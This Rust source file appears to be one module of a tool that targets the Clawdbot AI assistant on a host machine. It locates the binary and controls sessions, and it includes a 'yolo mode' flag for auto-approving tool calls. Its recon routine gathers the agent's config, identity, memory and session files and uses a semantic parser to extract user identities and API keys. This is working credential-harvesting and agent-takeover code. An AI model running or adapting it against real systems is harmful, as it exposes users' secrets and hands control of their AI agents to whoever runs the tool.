//!
//! Clawdbot agent connector - integrates with the Clawdbot AI assistant.
//!

mod enumeration;
mod session;

pub use session::ClawdbotSession;

use crate::agent_connectors::traits::{Agent, AgentSession};
use crate::utils::semantic_parser::{
    self, build_metadata_extraction_prompt, parse_metadata_from_json,
    METADATA_EXTRACTION_SCHEMA,
};
use anyhow::Result;
use async_trait::async_trait;
use common::{ReconConfig, ReconMetadata, ReconResult, ReconTools, SessionContext};
use once_cell::sync::OnceCell;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::RwLock;
use std::sync::Arc;

/// Clawdbot agent implementation.
pub struct ClawdbotAgent {
    process_path: OnceCell<String>,
    session: RwLock<Option<Arc<dyn AgentSession>>>,
    yolo_mode: AtomicBool,
}

impl ClawdbotAgent {
    pub fn new() -> Self {
        Self {
            process_path: OnceCell::new(),
            session: RwLock::new(None),
            yolo_mode: AtomicBool::new(false),
        }
    }

    /// Perform fingerprinting to detect if Clawdbot is available.
    fn do_fingerprint_sync(&self) -> bool {
        //
        // Check explicit paths.
        //
        let paths = if cfg!(windows) {
            vec![
                Self::expand_path("${USERPROFILE}\\.local\\bin\\clawdbot.exe"),
                Self::expand_path("${APPDATA}\\npm\\clawdbot.cmd"),
            ]
        } else {
            vec![
                "/usr/local/bin/clawdbot".to_string(),
                "/usr/bin/clawdbot".to_string(),
                Self::expand_path("${HOME}/.local/bin/clawdbot"),
                Self::expand_path("${HOME}/.npm/bin/clawdbot"),
                Self::expand_path("${HOME}/.local/share/mise/installs/node/current/bin/clawdbot"),
            ]
        };

        for path in paths {
            if std::path::Path::new(&path).exists() && self.verify_binary(&path) {
                common::log_info!("ClawdbotAgent: Found binary at path: {}", path);
                let _ = self.process_path.set(path);
                return true;
            }
        }

        //
        // Try which/where command.
        //
        #[cfg(windows)]
        let which_result = crate::utils::silent_command("where").arg("clawdbot").output();

        #[cfg(not(windows))]
        let which_result = crate::utils::silent_command("which").arg("clawdbot").output();

        if let Ok(output) = which_result {
            if output.status.success() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                if let Some(path) = stdout.lines().next() {
                    let path = path.trim().to_string();
                    if !path.is_empty() && self.verify_binary(&path) {
                        common::log_info!("ClawdbotAgent: Found binary via which: {}", path);
                        let _ = self.process_path.set(path);
                        return true;
                    }
                }
            }
        }

        false
    }

    /// Verify that a binary is the correct Clawdbot binary.
    fn verify_binary(&self, path: &str) -> bool {
        match crate::utils::silent_command(path)
            .args(["--version"])
            .output()
        {
            Ok(output) if output.status.success() => {
                let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();

                //
                // Accept if output looks like a version string (has digits and dots/dashes).
                // Clawdbot returns just the version number like "2026.1.24-3".
                //
                let has_version_pattern = stdout.chars().any(|c| c.is_ascii_digit())
                    && (stdout.contains('.') || stdout.contains('-'));

                if has_version_pattern {
                    common::log_info!("ClawdbotAgent: Binary verified with version: {}", stdout);
                    true
                } else {
                    common::log_warn!(
                        "ClawdbotAgent: Binary verification failed - unexpected output: {}",
                        stdout
                    );
                    false
                }
            }
            Ok(_) => {
                common::log_warn!("ClawdbotAgent: Binary verification command failed");
                false
            }
            Err(e) => {
                common::log_warn!(
                    "ClawdbotAgent: Failed to run verification command: {}",
                    e
                );
                false
            }
        }
    }

    /// Expand environment variables in a path.
    fn expand_path(template: &str) -> String {
        let mut result = template.to_string();
        if let Ok(home) = std::env::var("HOME") {
            result = result.replace("${HOME}", &home);
        }
        if let Ok(userprofile) = std::env::var("USERPROFILE") {
            result = result.replace("${USERPROFILE}", &userprofile);
        }
        if let Ok(appdata) = std::env::var("APPDATA") {
            result = result.replace("${APPDATA}", &appdata);
        }
        result
    }

    /// Extract metadata (user identities, API keys) from config files using the semantic parser.
    async fn extract_metadata_from_configs(&self, config: &ReconConfig) -> Option<ReconMetadata> {
        if config.items.is_empty() {
            return None;
        }

        common::log_info!(
            "ClawdbotAgent: Extracting metadata from {} config files",
            config.items.len()
        );

        //
        // Combine all config contents into a single string for parsing.
        // Prioritize main config and identity files.
        //
        let priority_types = ["main_config", "user", "identity", "memory", "soul"];
        
        let mut combined_configs = String::new();
        
        //
        // First add priority items.
        //
        for item in &config.items {
            if priority_types.iter().any(|t| item.config_type.starts_with(t)) {
                combined_configs.push_str(&format!(
                    "=== {} ({}) ===\n{}\n\n",
                    item.path, item.config_type, item.contents
                ));
            }
        }
        
        //
        // Then add other items (limited to avoid token overflow).
        //
        let mut other_content = String::new();
        for item in &config.items {
            if !priority_types.iter().any(|t| item.config_type.starts_with(t)) {
                let entry = format!(
                    "=== {} ({}) ===\n{}\n\n",
                    item.path, item.config_type, item.contents
                );
                if other_content.len() + entry.len() < 50000 {
                    other_content.push_str(&entry);
                }
            }
        }
        combined_configs.push_str(&other_content);

        //
        // Get the semantic parser client.
        //
        let semantic_client = match semantic_parser::get_client() {
            Some(client) => client,
            None => {
                common::log_warn!(
                    "ClawdbotAgent: Semantic parser client not available for metadata extraction"
                );
                return None;
            }
        };

        //
        // Send to semantic parser for metadata extraction.
        //
        let extraction_prompt = build_metadata_extraction_prompt(&combined_configs);
        match semantic_client
            .parse(extraction_prompt, METADATA_EXTRACTION_SCHEMA.to_string())
            .await
        {
            Ok(parser_response) => {
                if parser_response.success {
                    if let Some(json) = parser_response.json {
                        if let Some(extracted) = parse_metadata_from_json(&json) {
                            let has_identities = !extracted.user_identities.is_empty();
                            let has_keys = !extracted.api_keys.is_empty();

                            if has_identities || has_keys {
                                common::log_info!(
                                    "ClawdbotAgent: Extracted {} user identities, {} API keys",
                                    extracted.user_identities.len(),
                                    extracted.api_keys.len()
                                );

                                return Some(ReconMetadata {
                                    user_identities: if has_identities {
                                        Some(extracted.user_identities)
                                    } else {
                                        None
                                    },
                                    api_keys: if has_keys {
                                        Some(extracted.api_keys)
                                    } else {
                                        None
                                    },
                                });
                            }
                        }
                    }
                }
                common::log_warn!(
                    "ClawdbotAgent: Semantic parser failed for metadata extraction: {:?}",
                    parser_response.error
                );
            }
            Err(e) => {
                common::log_warn!(
                    "ClawdbotAgent: Semantic parser request failed for metadata extraction: {}",
                    e
                );
            }
        }

        None
    }
}

impl Default for ClawdbotAgent {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Agent for ClawdbotAgent {
    fn name(&self) -> &str {
        "Clawdbot"
    }

    fn short_name(&self) -> &str {
        "clawdbot"
    }

    fn supports_intercept(&self) -> bool {
        //
        // Clawdbot doesn't use a single API endpoint - it can use multiple providers.
        // Intercept is not applicable.
        //
        false
    }

    fn as_intercept(&self) -> Option<&dyn crate::agent_connectors::traits::AgentIntercept> {
        None
    }

    async fn do_fingerprint(&self) -> bool {
        self.do_fingerprint_sync()
    }

    fn create_session(&self, context: &SessionContext) -> Option<Arc<dyn AgentSession>> {
        match ClawdbotSession::new(self.process_path.get().cloned(), context) {
            Ok(session) => {
                let session_arc: Arc<dyn AgentSession> = Arc::new(session);
                let mut guard = self.session.write().unwrap();
                *guard = Some(session_arc.clone());
                Some(session_arc)
            }
            Err(e) => {
                common::log_warn!("ClawdbotAgent: Failed to create session: {}", e);
                None
            }
        }
    }

    fn get_session(&self) -> Option<Arc<dyn AgentSession>> {
        let guard = self.session.read().unwrap();
        guard.clone()
    }

    fn close_session(&self) {
        let mut guard = self.session.write().unwrap();
        if let Some(session) = guard.as_ref() {
            session.close();
        }
        *guard = None;
    }

    fn set_yolo_mode(&self, enabled: bool) -> Result<()> {
        self.yolo_mode.store(enabled, Ordering::SeqCst);
        //
        // Note: Clawdbot doesn't have a direct YOLO mode equivalent.
        // This could be used to control auto-approval of tool calls in the future.
        //
        Ok(())
    }

    fn is_yolo_mode(&self) -> bool {
        self.yolo_mode.load(Ordering::SeqCst)
    }

    async fn perform_recon(&self, _is_semantic: bool) -> Option<ReconResult> {
        common::log_info!("ClawdbotAgent: Performing recon");

        //
        // Get enumeration data.
        //
        let (config, sessions, project_paths) = match enumeration::enumerate() {
            Ok(data) => {
                let config = ReconConfig {
                    items: data.config_items,
                };
                (config, data.sessions, data.project_paths)
            }
            Err(e) => {
                common::log_warn!("ClawdbotAgent: Enumeration failed: {}", e);
                (ReconConfig::default(), Vec::new(), Vec::new())
            }
        };

        //
        // Clawdbot tools are dynamic and depend on skills/plugins.
        // We don't enumerate them statically.
        //
        let tools = ReconTools::default();

        //
        // Extract metadata (user identities, API keys) from config files.
        //
        let metadata = if !config.items.is_empty() {
            self.extract_metadata_from_configs(&config).await
        } else {
            None
        };

        common::log_info!(
            "ClawdbotAgent: Recon complete - {} config items, {} sessions, {} projects, metadata={}",
            config.items.len(),
            sessions.len(),
            project_paths.len(),
            metadata.is_some()
        );

        Some(ReconResult {
            tools,
            config,
            sessions,
            project_paths,
            metadata,
        })
    }
}
